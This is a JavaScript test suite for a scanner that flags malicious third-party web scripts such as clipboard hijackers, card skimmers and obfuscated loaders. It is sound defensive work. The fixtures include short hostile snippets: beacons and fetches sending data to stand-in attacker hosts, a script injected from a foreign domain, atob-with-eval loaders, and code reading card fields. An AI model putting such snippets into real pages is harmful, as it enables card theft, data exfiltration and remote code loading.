import { test } from "node:test";
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { scanScript } from "../src/rules.js";

const fixture = (name) =>
  readFileSync(new URL(`../fixtures/${name}`, import.meta.url), "utf8");
const ids = (findings) => findings.map((f) => f.id).sort();
const byId = (findings, id) => findings.find((f) => f.id === id);

test("clipper fixture is flagged as clipboard-hijack (high) and wallet-pattern (medium)", () => {
  const findings = scanScript(fixture("clipper.js"), "cdn.vendor.example");
  assert.equal(byId(findings, "clipboard-hijack")?.severity, "high");
  assert.equal(byId(findings, "wallet-pattern")?.severity, "medium");
});

test("harmless analytics script produces no findings", () => {
  assert.deepEqual(scanScript(fixture("analytics.js"), "cdn.vendor.example"), []);
});

test("plain copy-to-clipboard button is only clipboard-access (medium), not a hijack", () => {
  const src = `btn.onclick = () => navigator.clipboard.writeText(code.textContent);`;
  assert.deepEqual(ids(scanScript(src, "cdn.vendor.example")), ["clipboard-access"]);
  assert.equal(scanScript(src, "cdn.vendor.example")[0].severity, "medium");
});

test("atob combined with eval is an obfuscated-loader (high)", () => {
  const f = scanScript(`var p = atob("YWxlcnQoMSk="); eval(p);`, "x.example");
  assert.equal(byId(f, "obfuscated-loader")?.severity, "high");
});

test("atob combined with new Function is an obfuscated-loader", () => {
  const f = scanScript(`new Function(atob(s))()`, "x.example");
  assert.ok(byId(f, "obfuscated-loader"));
});

test("atob alone is not flagged", () => {
  assert.deepEqual(scanScript(`var img = atob(data);`, "x.example"), []);
});

test("reading card fields is card-field-access (high)", () => {
  for (const src of [
    `document.querySelector('input[autocomplete="cc-number"]').value`,
    `form.elements["cardnumber"].value`,
    `document.getElementById("cvc").value`,
  ]) {
    const f = scanScript(src, "x.example");
    assert.equal(byId(f, "card-field-access")?.severity, "high", src);
  }
});

test("hooking the input value setter is input-value-hook (high)", () => {
  const src = `var d = Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, 'value');`;
  assert.equal(byId(scanScript(src, "x.example"), "input-value-hook")?.severity, "high");
});

test("iOS-only branch on the user agent is ios-only-branch (medium)", () => {
  const src = `if (/iPhone|iPad/.test(navigator.userAgent)) { load(); }`;
  assert.equal(byId(scanScript(src, "x.example"), "ios-only-branch")?.severity, "medium");
});

test("sending data to a foreign domain is exfil-sink (medium) and names the host", () => {
  const src = `navigator.sendBeacon("https://collect.evil.example/c", data);`;
  const f = byId(scanScript(src, "cdn.vendor.example"), "exfil-sink");
  assert.equal(f?.severity, "medium");
  assert.match(f.evidence, /collect\.evil\.example/);
});

test("injecting a script tag from a foreign domain is exfil-sink", () => {
  const src = `var s=document.createElement('script');s.src='https://loader.evil.example/a.js';`;
  assert.ok(byId(scanScript(src, "cdn.vendor.example"), "exfil-sink"));
});

test("sending data to the script's own registrable domain is not flagged", () => {
  const src = `navigator.sendBeacon("https://collect.vendor.example/c", data); fetch("https://api.vendor.example/x")`;
  assert.deepEqual(scanScript(src, "cdn.vendor.example"), []);
});

test("known IoC domain from the Optimizely attack is known-ioc (high)", () => {
  const f = byId(scanScript(`var u="https://1688360.cc/track.js"`, "cdn.optimizely.com"), "known-ioc");
  assert.equal(f?.severity, "high");
});

test("every finding carries id, severity, title and a short evidence snippet", () => {
  for (const f of scanScript(fixture("clipper.js"), "x.example")) {
    assert.ok(f.id && f.severity && f.title, JSON.stringify(f));
    assert.ok(typeof f.evidence === "string" && f.evidence.length > 0 && f.evidence.length <= 200);
    assert.ok(!f.evidence.includes("\n"));
  }
});

// Regression tests from scanning real libraries (pdf-lib, pptxgenjs, mermaid, docx).
test("wallet-like substrings inside base64 blobs are not flagged", () => {
  const src = `var font="El8/o1X9wHSC6vHB3+byuKSxrrWy1hKbN7SLL2//3N4r4gepG2mbxePtH7yPNXDA45Sz+1rQAAHKTABgA4CNYuHDha7169Toj2+scMG";`;
  assert.deepEqual(scanScript(src, "x.example"), []);
});

test("identifiers merely containing 'iPad' (e.g. miniPadding) are not an iOS branch", () => {
  const src = `var cfg={miniPadding:2}; var ua=navigator.userAgent;`;
  assert.deepEqual(scanScript(src, "x.example"), []);
});

test("atob and new Function far apart in a large bundle are not an obfuscated-loader", () => {
  const src = `var img=atob(data);` + " ".repeat(5000) + `e = new Function("" + e);`;
  assert.deepEqual(scanScript(src, "x.example"), []);
});

// ---- Open review points: detection gaps ----
test("indirect eval forms running base64-decoded code are an obfuscated-loader", () => {
  for (const src of [
    `(0,eval)(atob("YWxlcnQoMSk="))`,
    `(0, eval)(atob(p))`,
    `window["eval"](atob(p))`,
    `setTimeout(atob("YWxlcnQoMSk="))`,
    `setInterval(atob(p), 10)`,
  ]) {
    assert.equal(byId(scanScript(src, "x.example"), "obfuscated-loader")?.severity, "high", src);
  }
});

test("setTimeout with a function near atob is not an obfuscated-loader", () => {
  const src = `var img = atob(data); setTimeout(function () { draw(img); }, 10);`;
  assert.deepEqual(scanScript(src, "x.example"), []);
});

test("document.execCommand('copy') is clipboard-access (medium)", () => {
  assert.deepEqual(ids(scanScript(`document.execCommand('copy')`, "x.example")), ["clipboard-access"]);
});

test("execCommand('copy') combined with a wallet address is a clipboard-hijack (high)", () => {
  const src = `ta.value = "0x000000000000000000000000000000000000dEaD"; ta.select(); document.execCommand("copy");`;
  assert.equal(byId(scanScript(src, "x.example"), "clipboard-hijack")?.severity, "high");
});

test("a skimmer matching input names with a regex like /cvv|cvc/ is card-field-access", () => {
  const src = `for (const i of inputs) if (/cvv|cvc/i.test(i.name)) grab(i);`;
  assert.equal(byId(scanScript(src, "x.example"), "card-field-access")?.severity, "high");
});

// ---- Open review points: false positives ----
test("identifiers named Cvc/cvc (class, call, parameter) are not card-field-access", () => {
  for (const src of [
    `class Cvc {} var c = new Cvc(el);`,
    `var c = Cvc(el);`,
    `function f(cvc) { return cvc; }`,
  ]) {
    assert.equal(byId(scanScript(src, "x.example"), "card-field-access"), undefined, src);
  }
});

// ---- Open review points: shared hosting and ccTLD second levels ----
test("another tenant of a shared hosting domain (cloudfront.net) is a foreign destination", () => {
  const src = `fetch("https://d999attacker.cloudfront.net/c", { method: "POST", body: d });`;
  const f = byId(scanScript(src, "d111vendor.cloudfront.net"), "exfil-sink");
  assert.match(f?.evidence ?? "", /d999attacker\.cloudfront\.net/);
});

test("the script's own tenant on a shared hosting domain is not foreign", () => {
  const src = `fetch("https://d111vendor.cloudfront.net/config.json")`;
  assert.deepEqual(scanScript(src, "d111vendor.cloudfront.net"), []);
});

test("a different owner under a ccTLD second level (.co.kr) is foreign, the same owner is not", () => {
  const foreign = byId(scanScript(`fetch("https://collect.attacker.co.kr/c")`, "cdn.shop.co.kr"), "exfil-sink");
  assert.match(foreign?.evidence ?? "", /collect\.attacker\.co\.kr/);
  assert.deepEqual(scanScript(`fetch("https://api.shop.co.kr/x")`, "cdn.shop.co.kr"), []);
});

// Final review I8: attacker-controlled content must not stall the scanner.
const timed = (fn) => { const t = process.hrtime.bigint(); fn(); return Number(process.hrtime.bigint() - t) / 1e6; };

test("1 MB of whitespace after a sink keyword scans in under 1 s", () => {
  const ms = timed(() => scanScript("fetch" + " ".repeat(1_000_000), "x.example"));
  assert.ok(ms < 1000, `took ${ms.toFixed(0)} ms`);
});

test("80k atob and 80k eval calls far apart scan in under 1 s", () => {
  const src = "atob(1);".repeat(80_000) + " ".repeat(1000) + "eval(1);".repeat(80_000);
  const ms = timed(() => scanScript(src, "x.example"));
  assert.ok(ms < 1000, `took ${ms.toFixed(0)} ms`);
});
